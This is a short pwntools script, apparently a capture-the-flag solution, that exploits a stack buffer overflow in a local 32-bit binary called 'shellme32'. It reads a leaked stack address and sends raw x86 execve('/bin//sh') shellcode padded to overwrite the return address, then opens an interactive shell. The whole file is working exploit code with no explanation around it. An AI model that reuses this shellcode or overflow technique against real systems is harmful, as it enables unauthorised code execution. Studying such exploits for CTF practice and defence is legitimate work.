from pwn import*
context(os='linux')
context.log_level = 'DEBUG'
e =ELF("./shellme32")
io = process(e.path)
io.recvuntil("0x")
v5_addr = int(io.recvline(), 16)
print v5_addr
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload=shellcode+(0x24+4-len(shellcode))*'a'+p32(v5_addr)
io.sendline(payload)
io.interactive()